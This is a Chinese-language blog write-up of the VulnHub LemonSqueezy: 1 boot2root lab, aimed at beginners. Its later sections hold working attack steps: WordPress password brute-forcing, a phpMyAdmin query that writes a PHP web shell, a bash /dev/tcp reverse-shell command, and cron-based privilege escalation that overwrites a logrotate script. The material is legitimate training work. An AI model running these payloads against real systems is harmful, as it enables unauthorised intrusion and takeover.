---
layout: post
title: "滲透測試練習 - 初見靶機 - LemonSqueezy: 1"
description: 第一次打靶機，整篇都在碎碎念
date: 2023-07-07 22:00:00 +0800
category: Writeup 靶機
tags: VulnHub 靶機 滲透測試
---

## 這篇文章在幹嘛？
模擬駭客入侵一台電腦，拿到最高權限，並取得重要資料的過程。

## 介紹

- **滲透測試**
    是一種模擬駭客攻擊的測試方式，用來找出我們系統中可能存在的安全問題。可以想像成，我們請了一個駭客試圖「闖入」我們的系統，並請他告訴我們他是如何做到的，以便我們可以修補這些漏洞。
    
    **本篇的練習，我們要扮演試圖「闖入」系統的駭客，透過各種方式，取得這個系統的最高權限（Root 權限），並提取系統中的重要資料。**
    
- **Boot2Root 挑戰**
    滲透測試並不是指對任何系統隨意的攻擊行為，而是需要在事先取得系統管理者許可的情況下進行。如果我們隨便攻擊別人的系統，除了不道德，更可能會有法律問題。
    
    **那要如何在安全的狀況下練習滲透測試呢？**
    
    有一種稱為 **Boot2Root** 的挑戰。這種挑戰是一種模擬滲透測試的練習題，通常會提供一個經過設計，包含一些漏洞的虛擬機，這個虛擬機就好像一個真實的系統一樣，存有各種已知與未知的弱點。我們可以**對虛擬機進行滲透測試的練習**，透過各種方式取得系統的最高權限（Root 權限），並獲得敏感資訊。這樣子的虛擬機我們稱之為**靶機**。
    
    在 Boot2Root 挑戰中，我們還需要尋找一個稱為 **flag** 的目標。這個 flag 基本上是一個沒特別意義的字串，通常被放在只有 Root 權限用戶才能訪問的地方。

    **為什麼我們需要在靶機中尋找這個 flag？**
    
    這是因為，在實際的滲透測試中，我們的目標並不僅僅是取得最高權限，我們可能還需要尋找並獲得系統中的敏感資訊，或者需要在系統中執行特定的任務。但在靶機中不可能真的放入敏感資訊，所以用 flag 來替代敏感資訊。因此，在靶機中取得 flag，就**表示你已經完全掌握了這個系統**，算是完成了這一個 Boot2Root 挑戰。

- **VulnHub**
    是一個**提供各種不同難度 Boot2Root 虛擬機的平台**。這些挑戰題目可能是由一些資安人員或愛好者設計的。你可以在上面找到各種類型的虛擬機器映像檔下載，接著就可以使用像是 VirtualBox 或 VMware Workstation  這類軟體，在自己的電腦上運行這些 Boot2Root 虛擬機。
    
    **本篇將會使用本平台中名為 LemonSqueezy: 1 的靶機來進行滲透測試的練習。**

- **VirtualBox, VMware Workstation**
    它們是一種可以讓我們**執行與管理虛擬機的工具**。我們可以用它在一台電腦上同時運行多個獨立不同的虛擬系統。例如在本篇的練習中，我們會同時運行兩個虛擬機，其中一個虛擬機上運行我們想要進行滲透測試的系統，而另一個虛擬機上運行我們用來進行攻擊的工具。

- **Kali Linux**
    是本篇用來進行攻擊的工具，它是一個預先安裝了許多滲透測試工具的 Linux 作業系統，它可以讓我們專注在滲透測試的練習上，不用頻繁的為了安裝各種工具而分心。

## 下載檔案
### 1. 虛擬機器執行軟體（擇一下載即可）
（本篇的練習是使用 VMware Workstation Pro）

- **VirtualBox**
    - 官方載點: [點我(〃∀〃)](https://www.virtualbox.org/wiki/Downloads)

- **VMware Workstation Player**
    - 官方載點: [點我(〃∀〃)](https://www.vmware.com/tw/products/workstation-player/workstation-player-evaluation.html)

- **VMware Workstation Pro**
    - 載點: 要錢，無法提供 (´;ω;`)

### 2. 攻擊目標
- **Vulnhub 平台上的 LEMONSQUEEZY: 1 虛擬機**
    - 原始載點: [點我下載(〃∀〃)](https://download.vulnhub.com/lemonsqueezy/LemonSqueezy.7z)
    - 備用載點: [也可以點我下載(〃∀〃)](https://drive.google.com/file/d/1-3GSM0lLvYNyZ2UgWa93QXoh8kSLMhoO/view?usp=sharing)

### 3. 攻擊工具
- **Kali Linux 虛擬機**
    - 原始載點: [點我下載(〃∀〃)](https://cdimage.kali.org/kali-2023.2/kali-linux-2023.2-vmware-amd64.7z)
    - 備用載點: [也可以點我下載(〃∀〃)](https://drive.google.com/file/d/1-3vt4VG2cmDIRk4RJt26c-CuXsVtQ4Fc/view?usp=sharing)


## 建立環境
### 1. 安裝虛擬機執行軟體
依照自己的習慣擇一安裝 VirtualBox 或 VMware Workstation Player/Pro （推薦裝 Pro）
安裝完成後再繼續下一步

### 2. 設置 LEMONSQUEEZY: 1 虛擬機
（以下皆為使用 VMware Workstation Pro 的情境）

- **載入虛擬機**
    下載下來的檔案解壓縮後會得到名為 **LemonSqueezy** 的資料夾
    直接點裡面的 **LemonSqueezy.vmx** 就可以載入虛擬機

    接著可能會出現有著以下訊息的提示視窗
    ```plaintext
    This virtual machine appears to be in use.

    If this virtual machine is not in use, 
    press the "Take Ownership" button to obtain 
    ownership of it. Otherwise, press the "Cancel" 
    button to avoid damaging it.

    Configuration file: C:\Users\Ovob\Surprise_Mothe
    rf\LemonSqueezy\LemonSqueezy.vmx.
    ```
    請選擇 **Take Ownership**
    >如果選擇 **Take Ownership** 後跳出錯誤訊息
    >可以嘗試刪除所有 LemonSqueezy 資料夾內副檔名為 **.lck** 的檔案

- **虛擬機開機**

    點選 **Power on this virtual machine** 來開機

    ![image](https://hackmd.io/_uploads/BJHxyvjH0.png)


    接著可能會出現有著以下訊息的提示視窗
    ```plaintext
    This virtual machine might have been moved or 
    copied.

    In order to configure certain management and 
    networking features, VMware Workstation needs 
    to know if this virtual machine was moved or 
    copied. 

    If you don't know, answer "I Copied It".
    ```
    選擇 **I Copied It**
    
 - **等待開機完成**
    開機過程中，沒意外的話啥都不用按，只要等待就好。
    最後會停在這個畫面，就表示開機成功。
    ![image](https://hackmd.io/_uploads/ry--JviH0.png)

    
 - **確認網路**
    確認虛擬機畫面訊息中的 **IP 欄位**。
    這個 IP 就是我們稍後要攻擊的目標系統，請記住它。
    ![image](https://hackmd.io/_uploads/HJY-JDoHR.png)

    >如果你的 **IP 欄位** 後是空白沒有 IP 的
    >表示這台虛擬機沒連到網路，但因為每個人狀況不太一樣
    >這邊給一些關鍵字，可以往這個方向爬文
    >Virtual Network Editor
    >VMware NAT
    

### 3. 設置 Kali Linux 虛擬機

- **載入虛擬機**
    下載下來的檔案解壓縮後會得到名為 
    **kali-linux-2023.2-vmware-amd64.vmwarevm** 
    的資料夾
    
    直接點裡面的 
    **kali-linux-2023.2-vmware-amd64.vmx**
    就可以載入虛擬機
 
- **虛擬機開機**
    點選 **Power on this virtual machine** 來開機
    
    ![image](https://hackmd.io/_uploads/S1ZMywirR.png)

    
    接著可能會出現有著以下訊息的提示視窗
    ```plaintext
    This virtual machine might have been moved or 
    copied.

    In order to configure certain management and 
    networking features, VMware Workstation needs 
    to know if this virtual machine was moved or 
    copied. 

    If you don't know, answer "I Copied It".
    ```
    選擇 **I Copied It** 
    
- **登入主機**
    開機過程中，和剛剛一樣，沒意外的話啥都不用按，只要等待就好。
    
    成功到了登入頁面後，使用以下資料來登入
    username: kali
    password: kali
    ![image](https://hackmd.io/_uploads/SkcfyDiSA.png)

### 4. 檢查網路
**從這個步驟開始到文章結束，接下來所有的操作都是在 Kali Linux 這台虛擬機內**
另一台 LEMONSQUEEZY: 1 虛擬機只要開機擺著，負責被我們攻擊就好了，不用去動它。


這步驟要檢查剛剛開啟的兩台虛擬機 
LEMONSQUEEZY: 1 和 Kali Linux 之間的網路是否可以互通
這樣我們才能使用 Kali Linux 這台虛擬機去對 LEMONSQUEEZY: 1 虛擬機做攻擊

- **使用 ping 命令**
    在 Kali Linux 虛擬機內打開 Terminal 後
    輸入以下命令
    並將其中的 IP 替換為你 LEMONSQUEEZY: 1 虛擬機的 IP：
    ```bash
    ping -c 4 IP
    ```

    例如我剛剛在 [設置 LEMONSQUEEZY: 1 虛擬機] **確認網路** 的步驟
    找到 LEMONSQUEEZY: 1 虛擬機的 IP 是 192.168.75.135
    所以我這邊要輸入的命令就是：
    ```bash
    ping -c 4 192.168.75.135
    ```
    ![image](https://hackmd.io/_uploads/BJX7kwiH0.png)

    > **`ping -c 4 IP`** 這個指令分成三個部分：
    > 
    > 1. **`ping`**：這是一個用於測試網絡連通性的命令。
    > 
    > 2. **`-c 4`**：這是 ping 命令的選項之一，它可以指定要發送的封包數量。在這個例子中，我們指定發送 4 個封包。
    > 
    > 3. **`IP`**：這是要 ping 的目標 IP
    > 
    ></br>總結來說，ping -c 4 IP 命令的作用是發送 4 個封包到指定的 IP 地址，並顯示與目標主機之間的連通性、往返時間等信息。
    
- **判斷是否互通**
    - **互通成功**
        若兩台虛擬機能夠互通，執行 ping 指令後會看到類似以下的回應：
        ```bash
        ┌──(kali㉿kali)-[~]
        └─$ ping -c 4 192.168.75.135
        PING 192.168.75.135 (192.168.75.135) 56(84) bytes of data.
        64 bytes from 192.168.75.135: icmp_seq=1 ttl=128 time=1.43 ms
        64 bytes from 192.168.75.135: icmp_seq=2 ttl=128 time=1.28 ms
        64 bytes from 192.168.75.135: icmp_seq=3 ttl=128 time=0.649 ms
        64 bytes from 192.168.75.135: icmp_seq=4 ttl=128 time=1.52 ms

        --- 192.168.75.135 ping statistics ---
        4 packets transmitted, 4 received, 0% packet loss, time 3036ms
        rtt min/avg/max/mdev = 0.649/1.218/1.524/0.340 ms
        ```
        注意 **4 packets transmitted, 4 received, 0% packet loss** 這行
        它表示傳送了四個封包後，有四個封包成功被接收到，沒有任何封包丟失，這就表示兩台虛擬機**可以**互相通訊。
    
    - **互通失敗**
        若兩台虛擬機無法互通，執行 ping 指令後會看到類似以下的回應：
        ```bash
        ┌──(kali㉿kali)-[~]
        └─$ ping -c 4 192.168.2.56 
        PING 192.168.2.56 (192.168.2.56) 56(84) bytes of data.
        From 192.168.1.1 icmp_seq=1 Destination Host Unreachable
        From 192.168.1.1 icmp_seq=2 Destination Host Unreachable
        From 192.168.1.1 icmp_seq=3 Destination Host Unreachable
        From 192.168.1.1 icmp_seq=4 Destination Host Unreachable

        --- 192.168.2.56 ping statistics ---
        4 packets transmitted, 0 received, +4 errors, 100% packet loss, time 3044ms
        pipe 3
        ```
        注意 **4 packets transmitted, 0 received, +4 errors, 100% packet loss, time 3044ms** 這行
        它表示傳送了四個封包後，完全沒有封包成功被接收到，所有封包都丟失了，這就表示兩台虛擬機**無法**互相通訊。
        >這時請先確認 **LEMONSQUEEZY: 1 這台虛擬機是否有開機**
        >如果確認有開機，那基本上就是 VMware 程式上網路設定的問題
        >網路的問題每個人狀況都不太一樣
        >一樣是這幾個關鍵字，可以往這個方向爬文解決
        >Virtual Network Editor
        >VMware Bridge
        >VMware NAT

## 開始滲透測試
**（注意：以下內容所有 192.168.75.135 的部分，請更換為自己的 LEMONSQUEEZY: 1 虛擬機 IP）**

### 0. 整理思路
確認兩台虛擬機是可以互通的之後，先來整理一下思路。

到目前為止，我們開啟了兩台虛擬機。
第一台虛擬機，名為 LEMONSQUEEZY: 1，是我們的攻擊目標。
另一台虛擬機，名為 Kali Linux ，是我們用來進行滲透測試的平台。

現在我們要扮演一位滲透測試者，試圖「闖入」 LEMONSQUEEZY: 1 虛擬機。
在預先安裝好各種工具的 Kali Linux 作業系統上，去對 LEMONSQUEEZY: 1 虛擬機做攻擊，取得最高權限，並找到敏感訊息，也就是 flag 字串。

### 1. 掃描 port
- **思路**
    目前我們對目標的認識，僅只知道它的 IP 地址為 192.168.75.135。

    當我們獲得特定的 IP 位址，可以說已在網路中找到該 IP 對應的主機。每一個 IP 位址都是唯一的，它會和一台特定的主機相對應。

    在知道 IP 位址之後，我們會運用 **port** 這一概念，來推斷該**主機可能運行的服務**。

    每個在網路上運行的應用程式或服務，都會使用一個特定的 port 號來接收和發送數據，而不僅僅是傳送到指定的 IP 位址。這就像是在一個大樓中，IP 相當於大樓獨一無二的地址，而 port 號則是大樓內部的房間號碼。訪客可以透過 IP 找到大樓的位置，接著透過 port 號找到特定的房間。而大樓就是我們的主機，每個不同的房間就是主機上各種不同的服務。

    port 號的範圍從 0 到 65535，而其中一些已被預設為特定的服務。例如，未加密傳輸的網頁(HTTP) 通常使用埠號80，而我們日常生活中瀏覽的大多數網頁都使用加密傳輸(HTTPS)，其埠號為443。

    所以這時我們只要知道有哪些 port 是開啟的，就可以猜測出可能有哪些服務正在運行，接著透過這些運行中服務的一些漏洞和缺陷，來「闖入」系統。
    
- **動手**
    有需多可以掃描 port 的工具，我這邊使用較常見的 nmap 來掃描 LEMONSQUEEZY: 1 虛擬機中，有開放的 port。

    在 Kali Linux 虛擬機的 Terminal 中輸入以下命令：
    （記得把 IP 部分替換成你自己 LEMONSQUEEZY: 1 虛擬機的 IP）
    ```bash
    nmap 192.168.75.135
    ```
    >這個命令分成兩個部分
    >
    >1. nmap: 網絡掃描工具
    >
    >2. 192.168.75.135: 指定目標主機的 IP 地址
    >
    ></br>總結來說，在這個命令中，我們正在試圖掃描 IP 地址為 192.168.75.135 的主機上，有哪些端口是開放的。藉此來推測出主機可能有運行的服務。

    </br>nmap 命令跑完後，會看到以下結果
    ```bash
    ┌──(kali㉿kali)-[~]
    └─$ nmap 192.168.75.135  
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-13 03:11 EDT
    Nmap scan report for lemonsqueezy (192.168.75.135)
    Host is up (0.0022s latency).
    Not shown: 999 filtered tcp ports (no-response)
    PORT   STATE SERVICE
    80/tcp open  http

    Nmap done: 1 IP address (1 host up) scanned in 4.04 seconds
    ```
    >在上面內容中的這一段
    >
    >PORT   STATE SERVICE
    >80/tcp open  http
    >
    >我們可以看到，port 號 80 是開啟的，這表示這台主機上運行著 http 服務，意味著該主機可能是一台網頁伺服器，使用者可以透過瀏覽器訪問該主機的網站。

### 2. 嘗試訪問網站

接著我們嘗試訪問網站。

在 Kali Linux 上打開 Firefox 瀏覽器
接著在網址欄位中輸入 http://192.168.75.135/
可以看到以下頁面
![image](https://hackmd.io/_uploads/rkgNkwjS0.png)

>顯示出這個頁面，表示這台主機正在使用 Apache2 當作網頁伺服器，並且我們成功和它連線。

### 3. 找出網站頁面
在確認目標主機運行的是網頁伺服器後
我們這時候就可以開始找，這個網站有哪些頁面

不同功能的頁面，會有不同的網址
使用 HackMD 的登入頁面來舉例
![image](https://hackmd.io/_uploads/ryVOcvorR.png)


>可以看到網址是 **52.198.73.36/login**
>
>**52.198.73.36 的部分是 IP**，代表這個網頁伺服器的 IP 位址
>
>**login** 的部分稱為路徑。它幫助我們導向到網站中特定的一頁。
>在這個例子中，login 這個路徑會導向到使用者登入的頁面。
>
>簡單來說，如果你在瀏覽器裡輸入網址 52.198.73.36/login，瀏覽器會先連線到 IP 位址 52.198.73.36 的伺服器，然後在這個伺服器裡找到對應於 login 路徑的那一頁，也就是登入頁面，最後把這個頁面顯示出來。

</br>那這就表示，我們可以透過猜測網址 **路徑的部分** ，來找出這個網站有哪些頁面，我們直接來試試看：
![image](https://hackmd.io/_uploads/r1et5PjrC.png)

>這邊可以看到我在網址的部分輸入了 **52.198.73.36/ovob**
>
>結果，我們看到一個錯誤代碼 404 的頁面，錯誤代碼 404 表示這個路徑 ovob 可能不存在。

### 4. 目錄爆破

- **介紹**
    剛剛提到的猜測路徑，如果用手動的去猜
    是一件非常困難的任務

    這時我們就可以使用稱為 **目錄爆破** 的方法，來自動化這個過程

    目錄爆破的程式會使用一些常見的路徑，去對我們的目標網站做測試，根據每個路徑返回的結果代碼，來判斷頁面是否存在，像是剛剛的 404 就表示頁面可能不存在，如果結果代碼是 200 就表示頁面可以正常訪問。

- **動手**
    一樣在 Kali Linux 虛擬機的 Terminal 中輸入以下命令：
    （IP 192.168.75.135 部分記得替換成自己的）
    ```
    dirb http://192.168.75.135/ -r
    ```
    >這個指令分成 **三個** 部分
    >1. dirb: 目錄爆破的程式
    >2. http://192.168.75.135/: 我們要去猜路徑的目標網站
    >3. -r: 不要進行遞迴搜尋，只找最上層資料夾，不繼續往下找
    >
    ></br>這邊會加上 -r 的原因是，我希望輸出比較好閱讀，如果對哪個資料夾有興趣，再執行命令單獨去做目錄爆破。
    >
    >總結來說，這個指令的用途就是去猜測 http://192.168.75.135/ 網站的路徑，並將成功猜到的路徑列出來。這樣我們就能知道，這個網站有哪些頁面可以讓我們使用。
    

    </br>dirb 掃描完成後，會得到以下結果：
    ```bash
    ┌──(kali㉿kali)-[~]
    └─$ dirb http://192.168.75.135/ -r

    -----------------
    DIRB v2.22
    By The Dark Raver
    -----------------

    START_TIME: Thu Jul 13 06:28:02 2023
    URL_BASE: http://192.168.75.135/
    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
    OPTION: Not Recursive

    -----------------

    GENERATED WORDS: 4612

    ---- Scanning URL: http://192.168.75.135/ ----
    
    + http://192.168.75.135/index.html (CODE:200|SIZE:10701)
    ==> DIRECTORY: http://192.168.75.135/javascript/
    ==> DIRECTORY: http://192.168.75.135/manual/
    ==> DIRECTORY: http://192.168.75.135/phpmyadmin/
    
    + http://192.168.75.135/server-status (CODE:403|SIZE:278)
    ==> DIRECTORY: http://192.168.75.135/wordpress/

    -----------------
    END_TIME: Thu Jul 13 06:28:04 2023
    DOWNLOADED: 4612 - FOUND: 2
    ```
    >整理一下上面的內容我們可以得知，在這一層目錄中
    >我們找到了**兩個頁面**
    > http://192.168.75.135/index.html (CODE:200|SIZE:10701)
    > http://192.168.75.135/server-status (CODE:403|SIZE:278)
    >
    >以及**四個資料夾**
    >==> DIRECTORY: http://192.168.75.135/javascript/
    >==> DIRECTORY: http://192.168.75.135/manual/
    >==> DIRECTORY: http://192.168.75.135/phpmyadmin/
    >==> DIRECTORY: http://192.168.75.135/wordpress/

    接下來我特別關注 phpmyadmin 和 wordpress 這兩個資料夾。因為 phpmyadmin 是用於管理 MySQL 資料庫的工具，而 WordPress 則是一個用來建構網站的工具。
    
---
### 以下還在順
---

### 5. 對 WordPress 下手

- **調查資訊**
    使用 wpscan 這個工具，列出使用者資訊
    ```bash
    wpscan --url http://192.168.75.135/wordpress -e u
    ```
    >找到兩個用戶: orange 和 lemon


- **對密碼進行字典攻擊**
    - **對用戶 lemon**
        ```bash
        wpscan --url http://192.168.75.135/wordpress -U lemon -P /usr/share/wordlists/rockyou.txt
        ```
    
        跑很久都沒找到密碼，先不管它


    - **對用戶 orange**.
        使用指令
        ```bash
        wpscan --url http://192.168.75.135/wordpress -U orange -P /usr/share/wordlists/rockyou.txt
        ```

        ```bash
        [+] Performing password attack on Xmlrpc against 1 user/s
        [SUCCESS] - orange / ginger                                                                                                             
        Trying orange / stephanie Time: 00:00:01 <> (165 / 14344557)  0.00%  ETA: ??:??:??

        [!] Valid Combinations Found:
         | Username: orange, Password: ginger

        ```

- 登入 WordPress 網站
    用上一步找出來的密碼來登入 WordPress 頁面
    Username: orange
    Password: ginger

    在發文草稿處發現，不過目前還不知道是啥，先記住
    以後可以拿來嘗試
    ```
    n0t1n@w0rdl1st!
    ```

### 6. 對 phpMyAdmin 下手
- **嘗試登入**
    進入  管理頁面
    Username: orange
    Password: n0t1n@w0rdl1st!
    ```
    http://192.168.75.135/phpmyadmin
    ```

- **留下 RCE 後門**
    利用 SQL 的查詢功能
    （這個好像不用 .php 只要 ovob 就好了）
    ```sql
    SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/wordpress/ovob.php"
    ```

- **測試是否成功**
    先使用最簡單的指令來測試 RCE 是否成功
    ```
    http://192.168.75.135/wordpress/ovob.php?cmd=whoami
    ```

- **反向 shell**
    確認成功後
    
    1. 先在 kali linux 上開啟 nc -lvvp 80 等待連線
        ![image](https://hackmd.io/_uploads/SkBjqviSR.png)

        
    2. 在 cmd 部分放上我們想要目標執行的命令
        **bash -c 'bash -i >& /dev/tcp/192.168.75.136/80 0>&1'**
                轉成 Url 編碼: 
                **bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.75.136%2F80%200%3E%261%27**
        在瀏覽器網址輸入
        ```
        http://192.168.75.135/wordpress/ovob.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.75.136%2F80%200%3E%261%27
        ```
        
    3. 在 kali linux 上可以看到已經成功獲得 shell
        ![image](https://hackmd.io/_uploads/BkAocDoS0.png)



### 7. 提升權限
但這時命令執行的權限是 www-data
而不是 root
![image](https://hackmd.io/_uploads/ByHn9virA.png)

現在的目標是要想辦法拿到 root 權限執行命令
    
- **LinEnum.sh**
    使用 LinEnum.sh 來取得 Linux 的資訊
    kali 開啟 http 伺服器讓網站下載 LinEnum.sh
    ![image](https://hackmd.io/_uploads/Hy3hcvoSA.png)

    </br>使用 wget 取得 LinEnum.sh
    ![image](https://hackmd.io/_uploads/BkE6cDjH0.png)

    </br>使用 chmod 777 LinEnum.sh 給權限，然後執行
    ![image](https://hackmd.io/_uploads/rkq65wjHR.png)

    </br>在掃瞄出的內容找到自動運行的腳本 /etc/crontab
    ![image](https://hackmd.io/_uploads/ryeCqviSA.png)



- **先在攻擊機等待接入**
    ![image](https://hackmd.io/_uploads/By5CcwoSA.png)

    
- **覆寫排程腳本**
    寫入反向 shell
    **echo "bash -c 'bash -i >& /dev/tcp/192.168.75.136/80 0>&1'" > /etc/logrotate.d/logrotate**
    並且確認寫入成功
    ![image](https://hackmd.io/_uploads/B1G1owoHA.png)

    等待2分鐘的自動排程執行，就可以獲得 root 權限了
    ![image](https://hackmd.io/_uploads/rJ3kiviS0.png)

### 8. 取得敏感資料

我想改成
sudo find / -iname "root*"


最後找到 flag 並且印出就全部完成了
cd /root
ls
cat root.txt

![image](https://hackmd.io/_uploads/SJ7ejDoSR.png)

## 參考資料
- [Raj Chandel - LemonSqueezy:1 Vulnhub Walkthrough](https://www.hackingarticles.in/lemonsqueezy1-vulnhub-walkthrough/)
- [Madhav Mehndiratta - LemonSqueezy Vulnhub Walkthrough](https://www.infosecarticles.com/lemonsqueezy-1-vulnhub-walkthrough/)
- [Suhel Ajjaman - LemonSqueezy Vulnhub Walkthrough](https://medium.com/@ajjaman.suhel/lemonsqueezy-vulnhub-walkthrough-716646b90fa7)
- [Empire Cybersecurity TV - #Easy - LemonSqueezy : 1 #VulnHub: Wordpress, phpMyAdmin Backdoor, CronJobs PrivESC](https://www.youtube.com/watch?v=2ZCoOzN4ozM&ab_channel=EmpireCybersecurityTV)